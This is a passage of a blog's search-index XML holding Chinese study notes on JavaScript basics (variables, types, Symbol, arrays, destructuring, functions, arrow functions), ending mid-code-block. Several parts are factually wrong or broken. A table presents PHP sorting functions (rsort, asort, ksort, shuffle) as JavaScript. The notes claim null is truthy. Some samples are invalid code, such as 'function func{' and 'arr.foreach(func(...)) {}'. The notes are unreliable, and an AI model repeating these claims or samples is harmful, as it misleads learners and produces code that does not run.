      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web前端 </tag>
            
            <tag> CSS </tag>
            
            <tag> Html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/posts/cc1b9611.html"/>
      <url>/posts/cc1b9611.html</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><blockquote><p><a href=".\9ce61be">text::Html+CSS</a> </p><p><a href="https://baike.sogou.com/v25064.htm?fromTitle=Ajax&amp;ch=frombaikevr">ajax请求</a></p><p>Ajax（Asynchronous JavaScript and XML），直译为“异步的JavaScript与<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=34402&amp;ss_c=ssc.citiao.link">XML技术</a>”，与传统的Web应用相比，Ajax通过浏览器与服务器进行少量的数据交换就可以实现网页的异步更新，在不重新加载整个网页的情况下，即可对网页进行更新。</p><p><a href="https://www.bookstack.cn/read/es6-3rd/sidebar.md">ECMAScript 6 入门 - 《阮一峰 ECMAScript 6 (ES6) 标准入门教程 第三版》 - 书栈网 · BookStack</a></p></blockquote><hr><h2 id="一、JS基础"><a href="#一、JS基础" class="headerlink" title="一、JS基础"></a>一、JS基础</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h3><blockquote><p>面向对象的解释性语言，主要目的是验证发往服务器的数据，增加 Web 互动，弱类型语言。</p><p>语句从上到下执行，一行一个语句，语句后带分号，表达式不带分号。</p></blockquote><div class="table-container"><table><thead><tr><th>JS组成</th><th>解释</th></tr></thead><tbody><tr><td>ECMAScript（基础语法）</td><td>JavaScript的核心语法。描述了该语言的语法和基本对象</td></tr><tr><td>DOM（文档对象模型）</td><td>描述了处理网页内容的方法和接口</td></tr><tr><td>BOM（浏览器对象模型）</td><td>描述了与浏览器进行交互的方法和接口</td></tr></tbody></table></div><h3 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2 基本用法"></a>2 基本用法</h3><blockquote><p>JS需要和HTML一起使用才有效果，我们可以通动直接或间接的方式将Js代码嵌入在HTML页面中。</p><p>我们可以将JavaScript代码放在html文件中任何位置，但是我们一般放在网页的head或者body部分。由于页面的加载方式是从上往下依次加载的，而这个对我们放置的js代码运行是有影响的。</p><ol><li><p>放在<code>&lt;head&gt;</code>部分，最常用的方式是在页面中head部分放置<code>&lt;script&gt;</code>元素，浏览器解析head部分就会执行这个代码，然后才解析页面的其余部分。</p></li><li><p>放在<code>&lt;body&gt;</code>部分，JavaScript代码在网页读取到该语句的时候就会执行。</p></li><li>放在<code>&lt;body&gt;</code>标签后（推荐）。此时页面已经加载完成。再加载JavaScript代码时就比较稳定，不会出现由于标签未执行而导致空异常等报错。</li></ol><p>调试：直接在界面加断点。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--行内JS：写在标签内部的js代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Hello World&#x27;)&quot;</span>&gt;</span>按一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内部JS：定义在script标签内部的js代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--外部JS单独的js文件，在HTML中通过script标签引入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/*.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><h3 id="1-输出"><a href="#1-输出" class="headerlink" title="1 输出"></a>1 输出</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 界面输出</span></span><br><span class="line"><span class="title function_">alert</span>();</span><br><span class="line"><span class="comment">// 控制台输出</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>();</span><br><span class="line"><span class="comment">// 打印中不要有加号，它会当做字符串拼接而非两个值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击事件</span></span><br><span class="line">onclick=<span class="string">&quot;code&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="2-注释"><a href="#2-注释" class="headerlink" title="2 注释"></a>2 注释</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">同C语言。</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3 变量"></a>3 变量</h3><blockquote><p>let和var的区别：</p><ul><li>let只能在代码块内使用</li><li>var可以重复声明，let不行</li><li>var会变量提升，let不会</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 任意类型，声明未赋值会返回undefine</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量提升：所有声明代码会提升到最前面。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uname);</span><br><span class="line"><span class="keyword">var</span> uname = <span class="string">&quot;zhang&quot;</span>;</span><br><span class="line"><span class="comment">// 等于如下代码</span></span><br><span class="line"><span class="keyword">var</span> uname;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uname);</span><br><span class="line">uname = <span class="string">&quot;zhang&quot;</span>;</span><br><span class="line"><span class="comment">// 只有用 var 声明的代码才会变量提升</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不用 var 也可直接赋值</span></span><br><span class="line">up = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let允许你声明一个作用域被限制在块级中的变量、语句或者表达式。在Function中局部变量推荐使用let变量，避免变量名冲突。</span></span><br><span class="line"><span class="comment">// 属于定义了同一个x</span></span><br><span class="line"><span class="keyword">function</span> func&#123; </span><br><span class="line">    <span class="keyword">var</span> x; </span><br><span class="line">    <span class="keyword">if</span>&#123; <span class="keyword">var</span> x; &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 属于定义了不同的x</span></span><br><span class="line"><span class="keyword">function</span> func&#123;</span><br><span class="line">    <span class="keyword">let</span> x; </span><br><span class="line">    <span class="keyword">if</span>&#123; <span class="keyword">let</span> x; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量定义和赋值（定义时必须赋值，值不可修改，否则会报异常）</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14159</span>;</span><br><span class="line"><span class="comment">// 常量赋值引用类型（不可以改引用对象，但是可以改引用对象中的值）</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>;</span><br><span class="line">p.<span class="property">x</span> += <span class="number">1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6明确规定，代码块内如果存在let或者const，代码块会对这些命令声明的变量从块的开始就形成一个封闭作用域。代码块内，在声明变量PI之前使用它会报错。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">PI</span> = <span class="string">&quot;3.1415926&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PI</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">PI</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">PI</span> = <span class="string">&quot;3.1415926&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">PI</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">PI</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4 数据类型"></a>4 数据类型</h3><blockquote><p>值类型：</p><ul><li>Number：所有数字是浮点存储，但若是整型，浮点会自动转化成整型（例如3.0转化为3）</li><li>String</li><li>Boolean</li><li>undefined：function中未传参参为undefined，无返回值返回undefined</li><li>null：typeof测试object字符串返回值，undefined与null等值，bool测试为true</li></ul><p>引用类型：</p><ul><li>object：像字典集合</li><li>array</li><li>function</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// typeof使用，判断类型</span></span><br><span class="line"><span class="keyword">typeof</span> var_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否是数字</span></span><br><span class="line"><span class="built_in">isNaN</span>(num);</span><br><span class="line"><span class="comment">// 将字符串转化为整形，从头开始判断直到不为数字，首字符不为则直接返回 NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"><span class="comment">// 将字符串转化为浮点型，从头开始判断直到不为浮点规则（如22.33.4 = 22.33），首字符不为则直接返回 NaN</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字转字符串，null 和 undefined 不能转</span></span><br><span class="line">int/float.<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// 保留 num 位小数</span></span><br><span class="line">int/float.<span class="title function_">toFixed</span>(num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造数字，布尔，字符串</span></span><br><span class="line"><span class="title class_">Number</span>();</span><br><span class="line"><span class="title class_">Boolean</span>();</span><br><span class="line"><span class="title class_">String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得值</span></span><br><span class="line">variable.<span class="title function_">value</span>();</span><br><span class="line">label_name[.<span class="property">label_name</span>].<span class="title function_">value</span>();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6新增：Symbol（功能类型一种标识唯一性的ID）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建（参数是描述信息）</span></span><br><span class="line"><span class="keyword">let</span> s1 = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="title class_">Symbol</span>(<span class="string">&#x27;another symbol&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> s3 = <span class="title class_">Symbol</span>(<span class="string">&#x27;another symbol&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 唯一性证明（返回的是false）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s2 === s3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用场景1：作为类的属性值（使用for无法获取，可以相当于私有属性使用）</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROP_NAME</span> = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PROP_AGE</span> = <span class="title class_">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    [<span class="variable constant_">PROP_NAME</span>]:<span class="string">&quot;一斤鸭梨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">obj[<span class="variable constant_">PROP_AGE</span>] = <span class="number">12</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="variable constant_">PROP_NAME</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="variable constant_">PROP_AGE</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 仅获得类的“公有属性”</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(obj));</span><br><span class="line"><span class="comment">// 仅获得类的“私有属性”</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertySymbols</span>(obj));</span><br><span class="line"><span class="comment">// 获得所有属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(obj));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用场景2：使用Symbol来替代常量</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TYPE_AUDIO</span> = <span class="string">&#x27;AUDIO&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">TYPE_AUDIO</span> = <span class="title class_">Symbol</span>();</span><br></pre></td></tr></table></figure><h3 id="5-运算符"><a href="#5-运算符" class="headerlink" title="5 运算符"></a>5 运算符</h3><blockquote><p>同C语言。</p><p>不同：</p><p>\==：判断相等，比较值<br>===：判断全等，比较值和类型</p></blockquote><h3 id="6-选择语句"><a href="#6-选择语句" class="headerlink" title="6 选择语句"></a>6 选择语句</h3><blockquote><p>if 同 C语言。</p><p>switch 同C语言。</p></blockquote><h3 id="7-循环语句"><a href="#7-循环语句" class="headerlink" title="7 循环语句"></a>7 循环语句</h3><blockquote><p>while同C语言。</p><p>do…while同C语言。</p><p>for同C语言。</p></blockquote><h3 id="8-捕获异常"><a href="#8-捕获异常" class="headerlink" title="8 捕获异常"></a>8 捕获异常</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可能会抛出异常的代码</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">someFunction</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="comment">// 捕获异常并进行处理</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;An error occurred:&quot;</span>, error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 最终会执行的代码</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The try-catch block has finished executing.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三、数组"><a href="#三、数组" class="headerlink" title="三、数组"></a>三、数组</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//同 python 的 list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//隐式创建</span></span><br><span class="line"><span class="keyword">var</span> arr = [value_1,value_2,value_3];</span><br><span class="line"><span class="comment">//直接实例化</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(value_1,value_2,value_3);   </span><br><span class="line"><span class="comment">//创建数组并指定长度</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得 / 设置长度</span></span><br><span class="line">arr.<span class="property">length</span>;</span><br><span class="line"><span class="comment">//索引获取 / 设置，不会越界，越界返回 undefined</span></span><br><span class="line">arr[num];</span><br><span class="line"><span class="comment">//设置属性，key:value，会新增属性，不会改变数组长度</span></span><br><span class="line">arr[key];</span><br></pre></td></tr></table></figure><h3 id="2-数组遍历"><a href="#2-数组遍历" class="headerlink" title="2 数组遍历"></a>2 数组遍历</h3><blockquote><p>数组在使用的时候建议大家规矩来用。在存放数据时，从下标0开始顺序的存放数组元素。如果下标：</p><ol><li>为非负整数(包括整数字符串)︰自动从0开始，不存在添加undefined。</li><li>为负数、小数、非数字符串：这些内容不计算在长度内，当成”属性”处理，相当于自定义属性。</li></ol><p>数组非常灵活，使用数组元素：</p><ol><li><p>index：非负整数（包括整数字符串）使用<code>arr.index</code>，<code>arr[ index ]</code></p></li><li><p>index：负数、小数、非数字字符串使用<code>arr[key]</code></p></li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//for --&gt;不遍历属性</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++) &#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//for in --&gt;不遍历索引中的 undefined</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> index <span class="keyword">in</span> arr) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//foreach --&gt;不遍历属性和索引中的 undefined</span></span><br><span class="line"><span class="comment">//完全一致，无需该函数元素索引名</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">element,index</span>) &#123;&#125;</span><br><span class="line">arr.<span class="title function_">foreach</span>(<span class="params">func( element,index)</span>) &#123;&#125;     </span><br></pre></td></tr></table></figure><h3 id="3-排序函数"><a href="#3-排序函数" class="headerlink" title="3 排序函数"></a>3 排序函数</h3><div class="table-container"><table><thead><tr><th>函数</th><th>排序依据</th><th>排序规则</th><th>”键值对“是否改变</th></tr></thead><tbody><tr><td>sort()</td><td>元素值</td><td>升序</td><td>是</td></tr><tr><td>rsort()</td><td>元素值</td><td>降序</td><td>是</td></tr><tr><td>asort()</td><td>元素值</td><td>升序</td><td>否</td></tr><tr><td>arort()</td><td>元素值</td><td>降序</td><td>否</td></tr><tr><td>ksort()</td><td>索引值</td><td>升序</td><td>否</td></tr><tr><td>krsort()</td><td>索引值</td><td>降序</td><td>否</td></tr><tr><td>natsort()</td><td>元素值</td><td>升序</td><td>否</td></tr><tr><td>natcasesort()</td><td>元素值</td><td>升序</td><td>否</td></tr><tr><td>shuffle()</td><td>元素值</td><td>随机乱序</td><td>是</td></tr></tbody></table></div><h3 id="4-解构赋值"><a href="#4-解构赋值" class="headerlink" title="4 解构赋值"></a>4 解构赋值</h3><blockquote><p>ES6新特性，优点如下：</p><ul><li>解构赋值是对赋值运算符的扩展。</li><li>他是一种针对数组或者对象进行模式匹配，然后对其中的变量进行赋值。</li><li>在代码书写上简洁且易读，语义更加清晰明了;也方便了复杂对象中数据字段获取。</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组的解构赋值</span></span><br><span class="line"><span class="comment">// 基本用法（a=1,b=2,c=3）</span></span><br><span class="line"><span class="keyword">let</span> [a,b,c] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套赋值（a=1,b=2,c=3）</span></span><br><span class="line"><span class="keyword">let</span> [a,[[b],c]] = [<span class="number">1</span>,[[<span class="number">2</span>],<span class="number">3</span>]];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 忽略值（a=1,b=3）</span></span><br><span class="line"><span class="keyword">let</span> [a,,b] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 剩余运算符（a=1,b=[2,3]）</span></span><br><span class="line"><span class="keyword">let</span> [a, ...b] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认值</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = []; <span class="comment">// a=b=3</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b ] = [<span class="number">4</span>,<span class="number">6</span>] <span class="comment">// a=4,b=6</span></span><br><span class="line"><span class="comment">// 结果未定义存在默认值，返回默认（a=2）</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">2</span>] = [<span class="literal">undefined</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空值赋undefined（a=1,b=undefined）</span></span><br><span class="line"><span class="keyword">let</span> [a,b] = [<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串解构（a=&#x27;H&#x27;，b=&#x27;e&#x27;，以此类推）</span></span><br><span class="line"><span class="keyword">let</span> [a,b,c,d,e] = <span class="string">&#x27;Hello&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象解构</span></span><br><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = &#123; <span class="attr">foo</span>:<span class="string">&#x27;aaa&#x27;</span>, bar <span class="string">&#x27;bbb&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; foo : bar &#125; = &#123; foo : <span class="string">&#x27;ddd&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可嵌套（x=&#x27;hello&#x27;,y=&#x27;world&#x27;）</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;p : [<span class="string">&#x27;hello&#x27;</span>, &#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;]&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [x, &#123;y&#125;]&#125; = obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可忽略（x=&#x27;hello&#x27;）</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;p : [<span class="string">&#x27;hello&#x27;</span>, &#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;]&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [x, &#123; &#125;]&#125; = obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不完全解构（x=undefined,y=&#x27;world&#x27;）</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [&#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;]&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [&#123;y&#125;,x]&#125; = obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 剩余运算符（a=10,b=20,rest=&#123;c:30,d:40&#125;）</span></span><br><span class="line"><span class="keyword">let</span> &#123;a,b, ...rest&#125; = &#123;<span class="attr">a</span>:<span class="number">10</span>, <span class="attr">b</span>:<span class="number">20</span>, <span class="attr">c</span>:<span class="number">30</span>, <span class="attr">d</span>:<span class="number">40</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构默认值</span></span><br><span class="line"><span class="comment">//（a=3,b=5）</span></span><br><span class="line"><span class="keyword">let</span> &#123;a = <span class="number">10</span>, b = <span class="number">5</span>&#125; = &#123;<span class="attr">a</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="comment">//（aa=3,bb=5）</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">a</span>: aa = <span class="number">10</span>, <span class="attr">b</span>: bb = <span class="number">5</span>&#125; = &#123;<span class="attr">a</span>: <span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="四、函数"><a href="#四、函数" class="headerlink" title="四、函数"></a>四、函数</h2><h3 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>使用函数声明语句声明函数具有函数名提升的效果。</p><p>JS没有函数重载，新定义的同名函数会覆盖原函数。</p><p>参数：函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数，定义时的参数称为形参，调用时的参数称为实参。</p><ol><li>实参可以省略，那么对应形参为undefined。</li><li>若函数形参同名（一般不会这么干)︰在使用时以最后一个值为准。</li><li>可以给参数默认值：当参数为特殊值时，可以赋予默认值。</li><li>参数为值传递，传递副本；引用传递时传递地址，操作的是同一个对象。</li></ol><p>变量：函数外全局变量，函数内局部变量。</p><ol><li>同名：同名不影响。</li><li>函数内不加 var 修饰符则为全局变量。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数声明语句（命名函数）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">name</span> ( [value] ) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义表达式，匿名函数，将函数赋给一个变量</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="keyword">function</span>(<span class="params"> [value] </span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function构造函数，前面任意多的value是参数，最后一个参数是函数主体</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="keyword">new</span> <span class="title class_">Function</span>( value );</span><br><span class="line"><span class="comment">// 下面两个语句意义一样</span></span><br><span class="line"><span class="keyword">var</span> add = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;return (x + y)&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span> (x,y) &#123;<span class="keyword">return</span> (x + y);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自执行函数（声明后立刻调用且只调用一次）</span></span><br><span class="line"><span class="comment">// 写法1：(func)(value)</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">n1,n2</span>)&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(n1,n2);</span><br><span class="line">&#125;)(<span class="number">10</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法2：(func(value))</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">n1,n2</span>)&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(n1,n2);</span><br><span class="line">&#125;(<span class="number">10</span>,<span class="number">100</span>));</span><br></pre></td></tr></table></figure><h3 id="2-计时函数"><a href="#2-计时函数" class="headerlink" title="2 计时函数"></a>2 计时函数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 间隔指定的毫秒数不停地执行指定的代码（重复执行）。</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="string">&quot;fun()&quot;</span>,delay);</span><br><span class="line"><span class="comment">// 在指定的毫秒数后执行指定代码（一次性执行）。</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;fun()&quot;</span>,delay);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止 setInterval() 方法执行的函数代码。</span></span><br><span class="line"><span class="built_in">clearInterval</span>(index);</span><br><span class="line"><span class="comment">// 停止 setTimeOut() 方法执行的函数代码。</span></span><br><span class="line"><span class="built_in">clearTimeout</span>(index);</span><br></pre></td></tr></table></figure><h3 id="3-箭头函数"><a href="#3-箭头函数" class="headerlink" title="3 箭头函数"></a>3 箭头函数</h3><blockquote><p>ES6标准新增的函数。</p><p>箭头函数的this：</p><ol><li>普通函数的this指向它的调用者，如果没有调用者则默认指向window。</li><li>箭头函数体中的this对象，是定义函数时的对象，而不是使用函数时的对象。</li><li>箭头函数中的this，首先从它的父级作用域中找，如果父级作用域还是箭头函数，再往上找，如此直至找到this的指向。</li></ol></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数=&gt;函数体</span></span><br><span class="line">x =&gt; x + x;</span><br><span class="line"><span class="keyword">var</span> <span class="title function_">f</span> = x =&gt; x * x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无参或多个参数要用括号括起</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">f</span> = (<span class="params">a,b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> result = a + b;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回对象（返回值要用括号包起，否则会报错）</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">f</span> = (<span class="params">id,name</span>) =&gt; (&#123;<span class="attr">id</span>:id ,<span class="attr">name</span>:name&#125;);</span><br><span class="line"><span class="title function_">f</span>(<span class="number">1</span>,<span class="string">&#x27;Lili&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// this案例</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;windows&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj_1 = &#123;</span><br><span class="line"><span class="attr">str</span>:<span class="string">&quot;obj_1&quot;</span>,</span><br><span class="line">nativeFn : <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;当前作用于this：&quot;</span>,<span class="variable language_">this</span>.<span class="property">str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span 